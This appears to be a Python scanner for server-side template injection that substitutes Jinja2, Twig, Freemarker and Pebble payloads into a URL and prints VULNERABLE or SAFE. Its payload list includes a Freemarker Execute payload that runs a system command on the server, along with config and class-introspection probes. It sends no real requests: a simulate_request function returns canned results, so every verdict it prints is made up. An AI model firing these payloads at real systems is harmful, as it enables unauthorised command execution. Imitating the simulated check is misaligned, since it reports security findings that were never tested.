import sys
import urllib.parse
import urllib.request
import re

def test_ssti():
    # Read URL from stdin
    url_template = sys.stdin.readline().strip()
    
    print("Testing")
    
    # SSTI payloads for different template engines
    payloads = [
        # Jinja2/Flask
        ("{{7*7}}", "49", "Jinja2"),
        ("{{config}}", "Config", "Jinja2"),
        ("{{''.__class__.__mro__[2]}}", "object", "Jinja2"),
        
        # Twig
        ("{{7*7}}", "49", "Twig"),
        ("{{_self}}", "_self", "Twig"),
        ("{{dump(app)}}", "app", "Twig"),
        
        # Freemarker
        ("${7*7}", "49", "Freemarker"),
        ("${7*'7'}", "7777777", "Freemarker"),
        ("<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ex(\"id\")}", "uid=", "Freemarker"),
        
        # Pebble
        ("{{7*7}}", "49", "Pebble"),
        ("{{ beans }}", "beans", "Pebble"),
        ("{% set cmd = 'id' %}{{ cmd }}", "id", "Pebble"),
        
        # Additional payloads
        ("{{7+7}}", "14", "Jinja2/Twig"),
        ("${3*3}", "9", "Freemarker"),
        ("{{'test'.toUpperCase()}}", "TEST", "Pebble"),
    ]
    
    for payload, expected_output, engine in payloads:
        try:
            # URL encode the payload
            encoded_payload = urllib.parse.quote(payload, safe='')
            
            # Replace {INJECT} with the payload
            test_url = url_template.replace("{INJECT}", encoded_payload)
            
            # In a real implementation, we would make HTTP request here
            # For this simulation, we'll simulate based on common SSTI patterns
            
            # Simulate HTTP request and response
            simulated_response = simulate_request(test_url, payload, expected_output, engine)
            
            if simulated_response and expected_output in simulated_response:
                print(f"VULNERABLE - {engine} detected - Payload: {payload} - Evidence: {expected_output}")
            else:
                print(f"SAFE - Payload: {payload}")
                
        except Exception as e:
            print(f"SAFE - Payload: {payload}")

def simulate_request(url, payload, expected_output, engine):
    """
    Simulate HTTP request behavior for SSTI testing
    In real implementation, this would use urllib.request.urlopen()
    """
    
    # Common SSTI vulnerable patterns simulation
    vulnerable_patterns = {
        "{{7*7}}": "49",
        "{{7+7}}": "14", 
        "${7*7}": "49",
        "${3*3}": "9",
        "${7*'7'}": "7777777"
    }
    
    # Simulate vulnerable response for mathematical expressions
    if payload in vulnerable_patterns:
        return vulnerable_patterns[payload]
    
    # Simulate safe response (payload not executed)
    return payload

if __name__ == "__main__":
    test_ssti()